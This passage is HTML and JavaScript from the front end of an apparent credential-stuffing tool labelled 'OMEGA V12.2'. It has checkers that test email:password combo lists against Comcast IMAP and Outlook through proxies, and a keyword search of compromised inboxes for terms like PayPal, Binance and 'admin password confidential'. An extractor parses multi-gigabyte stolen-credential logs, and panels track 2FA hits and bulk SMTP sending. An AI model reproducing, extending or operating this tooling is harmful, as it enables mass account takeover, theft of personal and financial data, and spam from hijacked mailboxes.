                        <div style="font-weight:800; color:var(--accent);">
                            <span id="comcast_status">IDLE</span>
                        </div>
                    </div>
                </div>
            </div>
            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:24px; margin-bottom:24px;">
                <div>
                    <label id="lbl-comcast-combos" style="font-size:0.7rem; color:var(--text-secondary); display:block; margin-bottom:8px;">COMCAST ACCOUNTS (EMAIL:PASSWORD)</label>
                    <textarea id="comcast_combos" style="height:250px; resize:none;" placeholder="user@comcast.net:password"></textarea>
                </div>
                <div style="display:flex; flex-direction:column; gap:16px;">
                    <div style="background:rgba(255,150,100,0.05); padding:16px; border-radius:12px; border:1px dashed #ff9664;">
                        <div id="lbl-comcast-title" style="font-size:0.75rem; color:#ff9664; font-weight:800; margin-bottom:4px;">⚡ COMCAST CHECKER</div>
                        <div id="lbl-comcast-desc" style="font-size:0.7rem; color:var(--text-secondary);">Supports:
                        <br/>• comcast.net
                        <br/><br/>Tests: IMAP Mail Access (imap.comcast.net:993)
                        </div>
                    </div>
                    <div style="display:flex; flex-direction:column; gap:8px;">
                        <div>
                            <label id="lbl-comcast-timeout" style="font-size:0.7rem; color:var(--text-secondary);">Timeout (seconds)</label>
                            <input type="number" id="comcast_timeout" value="10" min="5" max="60">
                        </div>
                    </div>
                </div>
            </div>
            <div style="display:flex; gap:16px; justify-content:flex-end; align-items:center;">
                <div id="comcast_progress" style="display:none; color:var(--accent); font-weight:700; font-size:0.8rem; margin-right:auto;">
                    <span class="dot-blink" style="background:var(--accent); width:8px; height:8px; border-radius:50%; display:inline-block; margin-right:8px;"></span>
                    CHECKING: <span id="comcast_checked">0</span> | <span style="color:#00ff63;">LIVE: <span id="comcast_live_count">0</span></span>
                </div>
                <div style="display:flex; align-items:center; gap:6px; margin-right:auto;">
                    <label style="font-size:0.65rem; color:var(--text-secondary); white-space:nowrap;">🔒 PROXIES:</label>
                    <textarea id="comcast_proxies" rows="2" style="height:52px; width:260px; resize:none; font-size:0.68rem; padding:4px 8px;" placeholder="socks5://host:port&#10;http://host:port  (residential)"
                        oninput="document.getElementById('comcast_proxy_count').textContent=(this.value.trim()?this.value.trim().split(/\n/).filter(l=>l.trim()).length:0)+' proxies'"></textarea>
                    <button type="button" class="btn btn-secondary" onclick="browseLocalFile('comcast_proxies')" style="padding:3px 8px; font-size:0.62rem;">📂</button>
                    <span id="comcast_proxy_count" style="font-size:0.62rem; color:var(--accent); background:rgba(0,255,163,0.1); padding:2px 6px; border-radius:20px; white-space:nowrap;">0 proxies</span>
                </div>
                <button class="btn btn-secondary" onclick="document.getElementById('comcast_results').innerHTML=''" id="btn-comcast-clear">Clear</button>
                <button class="btn btn-primary" onclick="startComcastChecker()" id="btn-comcast-start">Start Comcast Checker</button>
                <button class="btn btn-danger" onclick="comcast_running=false" id="btn-comcast-stop">Stop</button>
            </div>
            <div id="comcast_results" style="margin-top:24px; height:250px; overflow-y:auto; background:#000; padding:16px; border-radius:12px; border:1px solid var(--border); font-family:'JetBrains Mono', monospace; font-size:0.75rem; color:var(--accent);">Ready to check...</div>
        </div>
    </div>





    <!-- Search Global Inbox Tab -->
    <div id="search_tab" class="v-container">
        <div class="glass-card">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:24px;">
                <h2 id="title-global-search" style="margin:0; font-size:1.5rem; font-weight:800;">Global Keyword Search</h2>
                <div style="font-size:0.75rem; color:var(--text-secondary); margin-left:24px; flex:1;"><span id="lbl-gs-scan-prefix">System will scan</span> <span id="gs_available_count" style="color:var(--accent); font-weight:800;">(calculating...)</span> <span id="lbl-gs-scan-suffix">total accounts from your Valid.txt file.</span></div>
                <div class="stats-group" style="display:flex; gap:12px;">
                    <div class="stat-pill">
                        <span id="lbl-gs-total" style="color:var(--text-secondary)">TOTAL</span>
                        <span id="gs_count" style="color:var(--text-primary)">0</span>
                    </div>
                    <div class="stat-pill">
                        <span id="lbl-gs-matches" style="color:var(--text-secondary)">MATCHES</span>
                        <span id="gs_hits" style="color:var(--accent)">0</span>
                    </div>
                </div>
            </div>
            <div style="display:flex; gap:16px; margin-bottom:24px;">
                <input type="text" id="gs_keyword" placeholder="Enter keyword (e.g. PayPal, Netflix, Binance)..." style="flex:1; padding:12px 20px; font-size:0.95rem;">
                <button class="btn btn-primary" onclick="startGlobalSearch()" id="btn-gs-start">START SCAN</button>
                <button class="btn btn-danger" onclick="abortS()" id="btn-gs-stop">STOP</button>
            </div>
            <div id="gs_results" style="height:500px; overflow-y:auto; display:flex; flex-direction:column; gap:10px; padding:10px; border-radius:12px; background:rgba(0,0,0,0.2);">
                <div id="lbl-gs-hint" style="text-align:center; padding:40px; color:var(--text-secondary);">Enter a keyword to search across all validated accounts.</div>
            </div>
        </div>
    </div>

    <!-- Settings Tab -->
    <div id="settings_tab" class="v-container">
        <div class="glass-card" style="max-width:600px; margin: 0 auto;">
            <h2 id="title-settings" style="margin-bottom:24px; font-weight:800; color:var(--accent);">Core Engine Settings</h2>
            <div style="display:flex; flex-direction:column; gap:20px;">
                <div>
                    <label id="lbl-max-retries" style="font-size:0.75rem; color:var(--text-secondary); display:block; margin-bottom:8px;">MAX RETRIES (Smart Exponential Backoff)</label>
                    <input type="number" id="cfg_max_retries" value="3" min="0" max="10">
                </div>
                <div>
                    <label id="lbl-retry-delay" style="font-size:0.75rem; color:var(--text-secondary); display:block; margin-bottom:8px;">RETRY DELAY (Base seconds)</label>
                    <input type="number" id="cfg_retry_delay" value="2" min="1" max="10">
                </div>
                <div>
                    <label id="lbl-conn-timeout" style="font-size:0.75rem; color:var(--text-secondary); display:block; margin-bottom:8px;">CONNECTION TIMEOUT (Seconds)</label>
                    <input type="number" id="cfg_timeout" value="15" min="5" max="60">
                </div>
                <button class="btn btn-primary" onclick="saveSettings()" id="btn-save-settings" style="width:100%; margin-top:10px;">SAVE CONFIGURATION</button>
            </div>
            <div style="margin-top:24px; padding:16px; background:rgba(0,255,163,0.05); border-radius:12px; border:1px dashed var(--accent); font-size:0.8rem; color:var(--text-secondary);">
                <div style="color:var(--accent); font-weight:800; margin-bottom:6px;">OPTIMIZATION INFO</div>
                • <b>Max Retries:</b> Number of times to retry failed network calls using exponential backoff.<br>
                • <b>Retry Delay:</b> Base time to wait between retries. Total wait increases exponentially.<br>
                • <b>Timeout:</b> How long to wait for a server response before giving up.
            </div>

            <div style="margin-top:32px; border-top:1px solid var(--border); padding-top:24px;">
                <h3 id="title-domain-mapping" style="margin-bottom:16px; font-weight:800; color:var(--accent); font-size:1.1rem;">Custom Domain Mapping</h3>
                <div style="display:grid; grid-template-columns: 1fr 1fr; gap:12px; margin-bottom:12px;">
                    <div>
                        <label style="font-size:0.7rem; color:var(--text-secondary);">DOMAIN</label>
                        <input type="text" id="map_dom" placeholder="example.com">
                    </div>
                    <div>
                        <label style="font-size:0.7rem; color:var(--text-secondary);">IMAP HOST</label>
                        <input type="text" id="map_ih" placeholder="imap.example.com">
                    </div>
                </div>
                <div style="display:grid; grid-template-columns: 1fr 1fr; gap:12px; margin-bottom:12px;">
                    <div>
                        <label style="font-size:0.7rem; color:var(--text-secondary);">IMAP PORT</label>
                        <input type="number" id="map_ip" value="993">
                    </div>
                    <div>
                        <label style="font-size:0.7rem; color:var(--text-secondary);">SMTP HOST</label>
                        <input type="text" id="map_sh" placeholder="smtp.example.com">
                    </div>
                </div>
                <div style="display:grid; grid-template-columns: 1fr 1fr; gap:12px; margin-bottom:12px;">
                    <div>
                        <label style="font-size:0.7rem; color:var(--text-secondary);">SMTP PORT</label>
                        <input type="number" id="map_sp" value="587">
                    </div>
                    <div>
                        <label style="font-size:0.7rem; color:var(--text-secondary);">POP HOST (Optional)</label>
                        <input type="text" id="map_ph" value="pop.example.com">
                    </div>
                </div>
                <div style="display:grid; grid-template-columns: 1fr 1fr; gap:12px;">
                    <div>
                        <label style="font-size:0.7rem; color:var(--text-secondary);">POP PORT</label>
                        <input type="number" id="map_pp" value="995">
                    </div>
                    <div style="display:flex; align-items:flex-end;">
                        <button class="btn btn-primary" onclick="saveMapping()" style="width:100%;" id="btn-save-mapping">ADD MAPPING</button>
                    </div>
                </div>
                <p id="lbl-mapping-desc" style="font-size:0.7rem; color:var(--text-secondary); margin-top:12px;">Use this to fix domains that aren't auto-discovered. Settings are saved permanently.</p>
            </div>

        </div>
    </div>

    <!-- Extractors Tab -->
    <div id="extract_tab" class="v-container">
        <div class="glass-card">
            <h2 id="title-extractors" style="margin-bottom:24px; font-weight:800; color:var(--accent);">High-Speed ULP & Combo Extractor</h2>
            
            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:24px;">
                <!-- ULP Section -->
                <div style="background:rgba(0,255,163,0.02); padding:24px; border-radius:20px; border:1px solid var(--border);">
                    <h3 id="title-ulp-ext" style="margin:0 0 16px; font-size:1.1rem; color:var(--accent);">ULP to Email:Pass (5GB+ Support)</h3>
                    <div style="display:flex; flex-direction:column; gap:16px;">
                        <div>
                            <label id="lbl-ulp-file" style="font-size:0.7rem; color:var(--text-secondary);">ULP FILE PATH (URL:LOGIN:PASS)</label>
                            <div style="display:flex; gap:8px; margin-top:4px;">
                                <input type="text" id="ulp_file_path" placeholder="C:\Downloads\Log_5GB.txt">
                                <button class="btn btn-secondary" onclick="browseLocalFile('ulp_file_path')" style="flex-shrink:0;">BROWSE</button>
                            </div>
                        </div>
                        <div>
                            <label id="lbl-ulp-keyword" style="font-size:0.7rem; color:var(--text-secondary);">TARGET WEBSITE / KEYWORD (e.g. walmart, netflix, .it)</label>
                            <input type="text" id="ulp_keyword" placeholder="Enter keyword to filter..." style="margin-top:4px;">
                        </div>
                        <div style="display:flex; gap:12px; align-items:center;">
                            <input type="checkbox" id="ulp_only_emails" checked style="width:18px; height:18px;">
                            <label id="lbl-only-emails" style="font-size:0.7rem; color:var(--text-secondary);">ONLY EXTRACT EMAIL:PASS (Skip usernames)</label>
                        </div>
                        <button class="btn btn-primary" onclick="startULPExtract()" id="btn-ulp-start" style="width:100%;">START ULP EXTRACTION</button>
                    </div>
                </div>

                <!-- Combo Sorter Section -->
                <div style="background:rgba(255,255,255,0.02); padding:24px; border-radius:20px; border:1px solid var(--border);">
                    <h3 id="title-combo-sort" style="margin:0 0 16px; font-size:1.1rem; color:var(--text-primary);">Email:Pass Domain Sorter</h3>
                    <div style="display:flex; flex-direction:column; gap:16px;">
                        <div>
                            <label id="lbl-sort-input" style="font-size:0.7rem; color:var(--text-secondary);">PASTE COMBOS OR LOAD FILE</label>
                            <div style="display:flex; gap:8px; margin-top:4px;">
                                <input type="text" id="sort_file_path" placeholder="C:\Downloads\Combo_10GB.txt">
                                <button class="btn btn-secondary" onclick="browseLocalFile('sort_file_path')" style="flex-shrink:0;">BROWSE</button>
                            </div>
                            <textarea id="sort_input" style="height:100px; resize:none; margin-top:12px;" placeholder="...or paste combos here"></textarea>
                        </div>
                        <div>
                            <label id="lbl-custom-sort" style="font-size:0.7rem; color:var(--text-secondary);">CUSTOM DOMAINS (Optional, comma separated)</label>
                            <input type="text" id="sort_custom_domains" placeholder="gmail.com, hotmail.com, .it" style="margin-top:4px;">
                        </div>
                        <div style="display:flex; gap:12px;">
                            <button class="btn btn-secondary" onclick="startSorter('domain')" style="flex:1;">SORT BY DOMAIN</button>
                            <button class="btn btn-secondary" onclick="startSorter('country')" style="flex:1;">SORT BY COUNTRY</button>
                            <button class="btn btn-secondary" onclick="startSorter('mixed')" style="flex:1; background:rgba(255,163,0,0.1); border-color:rgba(255,163,0,0.3);">SORT MIXED (No HQ)</button>
                        </div>
                        <button class="btn btn-primary" onclick="saveSorted()" style="width:100%;">SAVE SORTED RESULTS (From Textbox)</button>
                    </div>
                </div>
            </div>

            <!-- Extraction Progress -->
            <div id="ext_status_box" style="margin-top:24px; display:none; background:#000; padding:20px; border-radius:12px; border:1px solid var(--accent);">
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <div style="display:flex; align-items:center; gap:12px;">
                        <div class="dot-blink" style="width:10px; height:10px; background:var(--accent); border-radius:50%;"></div>
                        <div style="font-weight:800; font-size:0.9rem; letter-spacing:1px;">EXTRACTION IN PROGRESS</div>
                    </div>
                    <button class="btn btn-danger" onclick="abortS()" style="padding:4px 12px; font-size:0.7rem;">ABORT</button>
                </div>
                <div style="display:grid; grid-template-columns: repeat(3, 1fr); gap:20px; margin-top:16px;">
                    <div class="stat-pill">LINES: <span id="e_lines" style="color:var(--accent); margin-left:8px;">0</span></div>
                    <div class="stat-pill">HITS: <span id="e_hits" style="color:var(--success); margin-left:8px;">0</span></div>
                    <div class="stat-pill">SPEED: <span id="e_speed" style="color:var(--text-primary); margin-left:8px;">0/s</span></div>
                </div>
                <div id="e_log" style="margin-top:12px; font-family:'JetBrains Mono'; font-size:0.7rem; color:var(--text-secondary); max-height:100px; overflow-y:auto;"></div>
            </div>
        </div>
    </div>

    <!-- Outlook Checker Tab -->
    <div id="outlook_tab" class="v-container">
        <div class="glass-card">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:24px;">
                <h2 id="title-outlook" style="margin:0; font-size:1.5rem; font-weight:800;">Outlook Checker (Login + Optional Keyword Search)</h2>
                <div style="display:flex; gap:12px;">
                    <div style="width:100px;">
                        <label id="lbl-out-threads" style="font-size:0.7rem; color:var(--text-secondary); display:block; margin-bottom:4px;">THREADS</label>
                        <input type="number" id="out_threads" value="50">
                    </div>
                </div>
            </div>
            <div style="display:grid; grid-template-columns: 1fr; gap:24px; margin-bottom:24px;">
                <div>
                    <label id="lbl-out-keywords" style="font-size:0.7rem; color:var(--text-secondary); display:block; margin-bottom:8px;">
                        🔑 KEYWORDS (Optional - Leave empty to just verify login)
                        <br/>
                        <span style="font-size:0.65rem; color:#999; font-style:italic;">If provided: Separated by space (e.g., admin password confidential)</span>
                    </label>
                    <input type="text" id="out_keywords" placeholder="[OPTIONAL] keyword1 keyword2 keyword3" style="margin-bottom:16px;">
                    
                    <label id="lbl-out-combos" style="font-size:0.7rem; color:var(--text-secondary); display:block; margin-bottom:8px;">COMBO LIST (USER:PASS)</label>
                    <textarea id="out_combos" style="height:300px; resize:none;" placeholder="example@outlook.com:password123&#10;user@hotmail.com:password123"></textarea>
                </div>
            </div>
            
            <div style="background:rgba(100,200,255,0.1); padding:12px; border-radius:8px; margin-bottom:16px; border-left:3px solid #64c8ff;">
                <div id="lbl-out-how" style="font-size:0.75rem; color:#64c8ff; font-weight:600;">ℹ️ How it works:</div>
                <div id="lbl-out-how-desc" style="font-size:0.7rem; color:#999; margin-top:4px;">
                    • If keywords are empty → Just validates login (fast)
                    <br/>
                    • If keywords provided → Validates login + searches inbox for keywords
                </div>
            </div>
            
            <div style="display:flex; gap:16px; justify-content:flex-end;">
                <button class="btn btn-primary" onclick="startOutlook()" id="btn-out-start">Start Outlook Checker</button>
                <button class="btn btn-danger" onclick="abortS()" id="btn-out-stop">Stop</button>
            </div>
            <div id="out_live" style="margin-top:24px; height:120px; overflow-y:auto; background:#000; padding:16px; border-radius:12px; border:1px solid var(--border); font-family:'JetBrains Mono', monospace; font-size:0.8rem; color:var(--accent);"></div>
            <div id="out_log" style="margin-top:12px; height:100px; overflow-y:auto; background:rgba(0,0,0,0.5); padding:12px; border-radius:12px; border:1px solid var(--border); font-family:'JetBrains Mono', monospace; font-size:0.7rem; color:var(--text-secondary);">Waiting for scan...</div>
        </div>
    </div>
</div>

<script>
    console.log("OMEGA V12.2 INITIALIZING");
    var curH=null, curF="INBOX", curP=1, curPH=1;

    // ═══ Country & Keyword Distribution Tracking ═══
    var countryStats = {};
    var keywordStats = {};
    var chartSeenHits = new Set();

    var CHART_COLORS = [
        '#a855f7','#06b6d4','#f43f5e','#10b981','#f59e0b','#6366f1','#ec4899',
        '#14b8a6','#ef4444','#8b5cf6','#22d3ee','#f97316','#84cc16','#e879f9',
        '#0ea5e9','#facc15','#fb923c','#34d399','#c084fc','#2dd4bf',
        '#f472b6','#38bdf8','#a3e635','#fbbf24','#818cf8','#fb7185',
        '#4ade80','#c4b5fd','#67e8f9','#fca5a5','#86efac','#d946ef',
        '#7dd3fc','#bef264','#fdba74','#5eead4','#a78bfa','#f9a8d4',
        '#93c5fd','#d9f99d','#fed7aa','#99f6e4','#c7d2fe','#fecdd3',
        '#a5f3fc','#fef08a','#fde68a','#ccfbf1','#e0e7ff','#ffe4e6'
    ];

    function extractCountryAndDomain(email) {
        if (!email || !email.includes('@')) return { country: null, domain: null };
        var domain = email.split('@')[1].toLowerCase();
        var parts = domain.split('.');
        var tld = parts[parts.length - 1].toUpperCase();
        // Map common TLDs to country codes
        var tldMap = {
            'COM':'US','NET':'US','ORG':'US','EDU':'US','GOV':'US',
            'CO':'CO','IO':'IO','AI':'AI','APP':'US','DEV':'US',
            'DE':'DE','FR':'FR','UK':'UK','IT':'IT','ES':'ES','NL':'NL','BE':'BE','AT':'AT','CH':'CH',
            'PL':'PL','CZ':'CZ','SE':'SE','NO':'NO','DK':'DK','FI':'FI','PT':'PT','IE':'IE','GR':'GR',
            'RU':'RU','UA':'UA','RO':'RO','HU':'HU','BG':'BG','HR':'HR','SK':'SK','SI':'SI','LT':'LT','LV':'LV','EE':'EE',
            'BR':'BR','AR':'AR','MX':'MX','CL':'CL','PE':'PE','EC':'EC','VE':'VE','UY':'UY',
            'CA':'CA','US':'US','AU':'AU','NZ':'NZ',
            'JP':'JP','CN':'CN','KR':'KR','TW':'TW','TH':'TH','VN':'VN','IN':'IN','PH':'PH','SG':'SG','MY':'MY','ID':'ID',
            'TR':'TR','IL':'IL','AE':'AE','SA':'SA','EG':'EG','KW':'KW','QA':'QA','BH':'BH','OM':'OM','JO':'JO','LB':'LB',
            'ZA':'ZA','NG':'NG','KE':'KE','GH':'GH','MA':'MA','TN':'TN','DZ':'DZ',
            'PK':'PK','BD':'BD','LK':'LK','NP':'NP','MM':'MM',
            'DO':'DO','CR':'CR','PA':'PA','GT':'GT','SV':'SV','HN':'HN','NI':'NI',
            'CU':'CU','BO':'BO','PY':'PY','GY':'GY','SR':'SR',
            'IS':'IS','LU':'LU','MT':'MT','CY':'CY','MK':'MK','RS':'RS','BA':'BA','ME':'ME','AL':'AL','XK':'XK',
            'IQ':'IQ','IR':'IR','AF':'AF','AM':'AM','AZ':'AZ','GE':'GE','KZ':'KZ','UZ':'UZ',
            'MQ':'MQ','RE':'RE','GP':'GP','GF':'GF','NC':'NC','PF':'PF','YT':'YT',
            'FL':'FL'
        };
        var country = tldMap[tld] || tld;
        // Known domains to keyword group
        var mainDomain = parts.length >= 2 ? parts[parts.length-2] : domain;
        return { country: country, domain: mainDomain };
    }

    function drawDonutChart(canvasId, data, tooltipId) {
        var canvas = document.getElementById(canvasId);
        if (!canvas) return;
        var ctx = canvas.getContext('2d');
        var w = canvas.width, h = canvas.height;
        var cx = w / 2, cy = h / 2;
        var outerR = Math.min(w, h) / 2 - 8;
        var innerR = outerR * 0.6;

        ctx.clearRect(0, 0, w, h);

        var total = 0;
        var entries = Object.entries(data).sort(function(a, b) { return b[1] - a[1]; });
        for (var i = 0; i < entries.length; i++) total += entries[i][1];
        if (total === 0) {
            // Draw empty ring
            ctx.beginPath();
            ctx.arc(cx, cy, outerR, 0, Math.PI * 2);
            ctx.arc(cx, cy, innerR, 0, Math.PI * 2, true);
            ctx.fillStyle = 'rgba(255,255,255,0.04)';
            ctx.fill();
            return;
        }

        var startAngle = -Math.PI / 2;
        var segments = [];
        for (var i = 0; i < entries.length; i++) {
            var pct = entries[i][1] / total;
            var sweep = pct * Math.PI * 2;
            var color = CHART_COLORS[i % CHART_COLORS.length];
            // Draw segment
            ctx.beginPath();
            ctx.arc(cx, cy, outerR, startAngle, startAngle + sweep);
            ctx.arc(cx, cy, innerR, startAngle + sweep, startAngle, true);
            ctx.closePath();
            ctx.fillStyle = color;
            ctx.fill();
            // Subtle gap between segments
            ctx.strokeStyle = '#06080c';
            ctx.lineWidth = 1.5;
            ctx.stroke();
            segments.push({ start: startAngle, end: startAngle + sweep, label: entries[i][0], count: entries[i][1], pct: pct, color: color });
            startAngle += sweep;
        }

        // Hover handler
        canvas.onmousemove = function(e) {
            var rect = canvas.getBoundingClientRect();
            var mx = (e.clientX - rect.left) * (w / rect.width);
            var my = (e.clientY - rect.top) * (h / rect.height);
            var dx = mx - cx, dy = my - cy;
            var dist = Math.sqrt(dx * dx + dy * dy);
            var angle = Math.atan2(dy, dx);
            if (angle < -Math.PI / 2) angle += Math.PI * 2;
            var tooltip = document.getElementById(tooltipId);
            if (dist >= innerR && dist <= outerR) {
                for (var s = 0; s < segments.length; s++) {
                    var seg = segments[s];
                    var sA = seg.start, eA = seg.end;
                    if (sA < -Math.PI / 2) sA += Math.PI * 2;
                    if (eA < -Math.PI / 2) eA += Math.PI * 2;
                    if (angle >= seg.start && angle < seg.end) {
                        if (tooltip) {
                            tooltip.style.display = 'block';
                            tooltip.textContent = seg.label + ': ' + seg.count + ' (' + (seg.pct * 100).toFixed(1) + '%)';
                            tooltip.style.left = (e.clientX - canvas.closest('.chart-canvas-wrap').getBoundingClientRect().left + 12) + 'px';
                            tooltip.style.top = (e.clientY - canvas.closest('.chart-canvas-wrap').getBoundingClientRect().top - 10) + 'px';
                        }
                        return;
                    }
                }
            }
            if (tooltip) tooltip.style.display = 'none';
        };
        canvas.onmouseleave = function() {
            var tooltip = document.getElementById(tooltipId);
            if (tooltip) tooltip.style.display = 'none';
        };
    }

    function renderChartLegend(containerId, data) {
        var el = document.getElementById(containerId);
        if (!el) return;
        var entries = Object.entries(data).sort(function(a, b) { return b[1] - a[1]; });
        var html = '';
        for (var i = 0; i < entries.length; i++) {
            var color = CHART_COLORS[i % CHART_COLORS.length];
            html += '<div class="chart-legend-item"><div class="chart-legend-color" style="background:' + color + '"></div>' + entries[i][0] + '</div>';
        }
        el.innerHTML = html;
    }

    function updateDistributionCharts() {
        drawDonutChart('countryChart', countryStats, 'countryTooltip');
        renderChartLegend('countryLegend', countryStats);
        var countryCount = Object.keys(countryStats).length;
        var el1 = document.getElementById('countryTotal');
        if (el1) el1.textContent = countryCount;

        drawDonutChart('keywordChart', keywordStats, 'keywordTooltip');
        renderChartLegend('keywordLegend', keywordStats);
        var keywordCount = Object.keys(keywordStats).length;
        var el2 = document.getElementById('keywordTotal');
        if (el2) el2.textContent = keywordCount;
    }

    function trackHitForCharts(hitUser) {
        if (!hitUser || chartSeenHits.has(hitUser)) return;
        chartSeenHits.add(hitUser);
        var info = extractCountryAndDomain(hitUser);
        if (info.country) {
            countryStats[info.country] = (countryStats[info.country] || 0) + 1;
        }
        if (info.domain) {
            keywordStats[info.domain] = (keywordStats[info.domain] || 0) + 1;
        }
    }
    var isOwaMode=false, curOwaFolderMap={}, curFolderId="inbox";
    var currentMessages = [];
    var mailRefreshTimer = null;

    function parseMailDate(dStr) {
        if (!dStr) return 0;
        var parsed = Date.parse(dStr);
        if (!isNaN(parsed)) return parsed;
        var match = dStr.match(/^(\d{4})-(\d{2})-(\d{2})/);
        if (match) {
            return new Date(match[1], match[2] - 1, match[3]).getTime();
        }
        return 0;
    }

    function isMsHit(hit){
        if(!hit) return false;
        var domain = (hit.split(':')[0]||'').toLowerCase().split('@')[1]||'';
        return /outlook\.|hotmail\.|live\.|msn\.com|live\.com/.test(domain);
    }

    window.onload = function() {
        var splashAudio = document.getElementById('splash-audio');
        var splashEl = document.getElementById('splash');
        var audioStarted = false;

        function startAudio() {
            if (splashAudio && !audioStarted) {
                splashAudio.volume = 0.6;
                var p = splashAudio.play();
                if (p) p.catch(function() {});
                audioStarted = true;
            }
        }

        function stopAudio() {
            if (splashAudio) {
                splashAudio.pause();
                splashAudio.currentTime = 0;
            }
        }

        // Try autoplay immediately
        startAudio();

        // Browser autoplay fallback: start audio on ANY user interaction (click/keydown)
        document.addEventListener('click', function startOnClick() {
            startAudio();
        }, { once: false });

        document.addEventListener('keydown', function startOnKey() {
            startAudio();
        }, { once: false });

        // Hide splash after 3 seconds
        setTimeout(function() {
            splashEl.classList.add('hidden');
            // Do not stop audio so it continues in the background!
        }, 3000);
    };


    function sh(id, el){
        var cs = document.querySelectorAll('.v-container');
        for(var i=0; i<cs.length; i++) cs[i].style.display = 'none';
        var ns = document.querySelectorAll('.nav-item');
        for(var i=0; i<ns.length; i++) ns[i].classList.remove('active');
        document.getElementById(id).style.display = 'flex';
        el.classList.add('active');
    }

    function connectWS() {
        var ws_proto = window.location.protocol === "https:" ? "wss://" : "ws://";
        var ws = new WebSocket(ws_proto + window.location.host + "/stats_ws");
        ws.onmessage = function(e){
            var d = JSON.parse(e.data);
            
            const setVal = (id, val) => {
                let el = document.getElementById(id);
                if(el) el.innerText = val;
            };
            const setHTML = (id, html) => {
                let el = document.getElementById(id);
                if(el) el.innerHTML = html;
            };

            setVal('s_db', d.disc_found + "/" + d.disc_total);
            setVal('s_ch', d.checked);
            setVal('s_vi', d.valid);
            
            setVal('s_smtp_ch', d.smtp_checked);
            setVal('s_smtp_vi', d.smtp_live);
            
            // Extraction Progress Update
            let extProg = document.getElementById('ext_prog_info');
            if(extProg){
                if(d.is_extracting){
                     extProg.style.display = 'flex';
                     setVal('s_ext_val', d.smtp_checked);
                } else {
                     extProg.style.display = 'none';
                }
            }

            setVal('s_sent', d.sent);
            setVal('s_fail', d.failed);
            setVal('s_2fa', d.two_factor || 0);
            setVal('s_multi', d.multi_pass_hits || 0);
            setVal('s_gmail_ch', d.gmail_checked || 0);
            setVal('s_gmail_vi', d.gmail_live || 0);
            
            // Global Search Sync
            setVal('gs_count', d.search_count);
            setVal('gs_hits', d.search_hits);
            setVal('gs_available_count', d.disc_total);

            if(d.search_results && d.search_results.length > 0){
                 var html = "";
                 for(var i=d.search_results.length-1; i>=0; i--){
                     var r = d.search_results[i];
                     var safeHit = r.hit.replace(/'/g, "\\'").replace(/"/g, "&quot;");
                     var safeSub = (r.sub || "").replace(/'/g, "\\'").replace(/"/g, "&quot;");
                     html += '<div class="glass-card mail-item" style="padding:12px 16px; margin:0;" onclick="jumpToMail(\''+safeHit+'\',\'INBOX\',\''+r.id+'\')">' +
                             '<div style="font-size:0.75rem; color:var(--accent); font-weight:800; margin-bottom:4px;">ACCOUNT: '+r.hit.split(':')[0]+'</div>' +
                             '<div style="font-weight:700; font-size:0.85rem; margin-bottom:2px;">'+(r.from || "")+'</div>' +
                             '<div style="font-size:0.8rem; color:var(--text-primary); margin-bottom:4px;">'+(r.sub || "(No Subject)")+'</div>' +
                             '<div style="font-size:0.7rem; color:var(--text-secondary);">'+(r.date || "")+'</div>' +
                             '</div>';
                 }
                 setHTML('gs_results', html);
            }

            if(d.live && d.live.length > 0){
                var html = "";
                for(var i=0; i<d.live.length; i++){
                    html += "<div>[" + d.live[i].proto + "] " + d.live[i].user + "</div>";
                    trackHitForCharts(d.live[i].user);
                }
                setHTML('live', html);
                updateDistributionCharts();
            }

            // Also track SMTP hits for charts
            if(d.smtp_hits && d.smtp_hits.length > 0){
                for(var si=0; si<d.smtp_hits.length; si++){
                    trackHitForCharts(d.smtp_hits[si].user);
                }
                updateDistributionCharts();
            }

            if(d.smtp_hits && d.smtp_hits.length > 0){
                var h = "";
                for(var i=0; i<d.smtp_hits.length; i++){
                    h += "<div>[" + d.smtp_hits[i].cat + "] " + d.smtp_hits[i].user + " @ " + d.smtp_hits[i].host + "</div>";
                }
                setHTML('smtp_live', h);
            }

            if(d.smtp_log && d.smtp_log.length > 0){
                 var logHTML = "";
                 for(var i=d.smtp_log.length-1; i>=0; i--){
                     logHTML += "<div>" + d.smtp_log[i] + "</div>";
                 }
                 setHTML('smtp_log', logHTML);
            }

            if(d.sender_log){
                var l = "";
                for(var i=0; i<d.sender_log.length; i++){
                    var color = d.sender_log[i].includes('FAIL') ? 'var(--danger)' : (d.sender_log[i].includes('SENT') ? 'var(--success)' : '#fff');
                    l += "<div style='color:"+color+"'>" + d.sender_log[i] + "</div>";
                }
                setHTML('sender_console', l);
                let sc = document.getElementById('sender_console');
                if(sc && d.sender_log.length > 0) sc.scrollTop = sc.scrollHeight;

                // === EMMAILING: Mirror sender_log to emmailing_console ===
                var el = "";
                for(var i=0; i<d.sender_log.length; i++){
                    var ecolor = d.sender_log[i].includes('FAIL') ? '#ff4646' : (d.sender_log[i].includes('ACCEPTED') ? '#00ff63' : (d.sender_log[i].includes('ENGINE') ? '#6495ed' : '#aaa'));
                    el += "<div style='color:"+ecolor+"; padding:1px 0;'>" + d.sender_log[i] + "</div>";
                }
                setHTML('emmailing_console', el);
                let ec = document.getElementById('emmailing_console');
                if(ec && d.sender_log.length > 0) ec.scrollTop = ec.scrollHeight;
            }

            // === EMMAILING DASHBOARD STATS ===
            var emSent = d.sent || 0;
            var emFail = d.failed || 0;
            var emStatTotal = document.getElementById('emmailing_stat_total');
            var emTotal = emStatTotal ? parseInt(emStatTotal.innerText) || 0 : 0;
            var emPending = emTotal - emSent - emFail;
            if(emPending < 0) emPending = 0;
            setVal('emmailing_stat_sent', emSent);
            setVal('emmailing_stat_fail', emFail);
            setVal('emmailing_stat_pending', emPending);


            // Outlook Sync
            setVal('s_out_ch', d.outlook_checked || 0);
            setVal('s_out_vi', d.outlook_hits || 0);
            setVal('s_out_cu', d.outlook_custom || 0);

            if(d.outlook_hits_list && d.outlook_hits_list.length > 0){
                 var h = "";
                 for(var i=0; i<d.outlook_hits_list.length; i++){
                        h += "<div style='display:flex; justify-content:space-between; align-items:center; margin-bottom:4px; padding:4px; border-bottom:1px solid rgba(255,255,255,0.05);'>" +
                          "<span>[HIT] " + d.outlook_hits_list[i].user + " | Mails: " + d.outlook_hits_list[i].mails + "</span>" +
